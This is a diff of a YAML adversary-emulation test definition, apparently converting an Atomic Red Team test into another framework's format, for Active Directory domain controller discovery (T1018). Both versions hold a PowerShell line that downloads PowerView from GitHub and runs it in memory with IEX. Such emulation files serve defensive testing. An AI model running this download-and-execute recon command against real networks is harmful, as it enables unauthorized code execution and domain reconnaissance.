@@ -1,13 +1,15 @@
-- id: c8807478-3628-569a-be5b-74a55129cd4a
+- requirements: []
   name: Soumaia ART Tests - Get-DomainController with PowerView
   description: Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.
   tactic: discovery
-  technique:
-    attack_id: T1018
-    name: Remote System Discovery
-  platforms:
-    windows:
-      psh:
-        command: |-
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
+  technique_id: T1018
+  technique_name: Remote System Discovery
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1'' -UseBasicParsing); Get-DomainController -verbose'
+  id: c8807478-3628-569a-be5b-74a55129cd4a
